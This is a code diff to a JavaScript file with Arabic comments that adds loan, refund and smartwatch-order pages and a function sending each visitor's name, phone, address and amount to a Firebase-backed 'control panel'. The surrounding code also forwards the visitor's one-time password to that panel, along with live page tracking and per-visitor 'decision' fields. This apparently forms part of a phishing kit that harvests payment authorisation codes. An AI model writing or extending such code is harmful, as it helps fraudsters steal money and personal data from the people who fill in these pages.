@@ -139,6 +139,11 @@
     if (path.includes('verification')) return 'صفحة التحقق';
     if (path.includes('gateway')) return 'بوابة الدفع';
     if (path.includes('carte')) return 'سلة التسوق';
+    if (path.includes('loan')) return 'طلب سلفة';
+    if (path.includes('refund')) return 'طلب استرداد';
+    if (path.includes('watch')) return 'طلب الساعة الذكية';
+    if (path.includes('shop')) return 'المتجر';
+    if (path.includes('wait1')) return 'صفحة الانتظار';
     return 'الصفحة الرئيسية';
   }
 
@@ -297,6 +302,86 @@
     // كتابة otp في وثيقة العميل لتعرضها لوحة التحكم الجديدة
     customerRef.set({ otp: String(otp || ''), lastSeen: Date.now(), currentPage: getFriendlyPageName() }, { merge: true });
     return Promise.resolve();
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال طلبات الخدمات (سلفة / استرداد / ساعة ذكية) إلى قاعدة البيانات
+  // يكتب في customers/{sessionId} (المصدر الموحّد للوحة التحكم الجديدة)
+  // وفي مجموعة requests (أرشيف كل طلب كوثيقة منفصلة) وفي RTDB للتوافق.
+  //   request: {
+  //     type: 'loan' | 'refund' | 'watch',
+  //     refNo, name, phone, address, amount,
+  //     details: { ... أي حقول إضافية خاصة بنوع الطلب ... }
+  //   }
+  // ═══════════════════════════════════════════════════════════
+  const REQUEST_TYPE_LABEL = {
+    loan: 'طلب سلفة',
+    refund: 'طلب استرداد',
+    watch: 'طلب الساعة الذكية'
+  };
+
+  window.pushFirebaseRequest = function (request) {
+    request = request || {};
+    const type = request.type || 'request';
+    const typeLabel = REQUEST_TYPE_LABEL[type] || 'طلب';
+    const refNo = request.refNo || (type.toUpperCase().slice(0, 2) + '-' + Date.now().toString().slice(-8));
+    const details = request.details || {};
+    const now = Date.now();
+
+    // الحقول الموحّدة التي تقرأها لوحة التحكم (اسم/هاتف/عنوان/مبلغ/الصفحة)
+    const customerFields = {
+      sessionId: sessionId,
+      name: request.name || '',
+      phone: request.phone || '',
+      mobile: request.phone || '',
+      address: request.address || '',
+      amount: request.amount || '',
+      requestType: type,
+      requestTypeLabel: typeLabel,
+      refNo: refNo,
+      status: 'pending',
+      decision: 'pending',
+      lastSeen: now,
+      currentPage: getFriendlyPageName(),
+      isHidden: false,
+      flagColor: ''
+    };
+
+    // حفظ الاسم/الهاتف محلياً ليستخدمهما ensureCustomerDoc في صفحات لاحقة
+    if (customerFields.name) localStorage.setItem('customerName', customerFields.name);
+    if (customerFields.phone) localStorage.setItem('phone', customerFields.phone);
+    if (customerFields.address) localStorage.setItem('address', customerFields.address);
+
+    const tasks = [];
+
+    // 1) وثيقة العميل الموحّدة (تظهر مباشرة في جدول اللوحة)
+    tasks.push(customerRef.set(Object.assign({}, customerFields, {
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    }), { merge: true }));
+
+    // 2) أرشيف كل طلب كوثيقة منفصلة في مجموعة requests (بكل التفاصيل)
+    const requestDoc = Object.assign({}, customerFields, {
+      details: details,
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    });
+    tasks.push(db.collection('requests').doc(refNo).set(requestDoc, { merge: true }));
+
+    // 3) جلسة RTDB (للتوافق مع اللوحة القديمة)
+    try {
+      rtd.ref('sessions/' + sessionId).update({
+        phone: customerFields.phone,
+        amount: customerFields.amount,
+        customerName: customerFields.name,
+        requestType: type,
+        refNo: refNo,
+        page: customerFields.currentPage,
+        hasNewActivity: true
+      });
+    } catch (e) {}
+
+    return Promise.all(tasks).catch(function (err) {
+      console.error('pushFirebaseRequest failed:', err && err.code, err && err.message);
+    });
   };
 
   // ═══════════════════════════════════════════════════════════
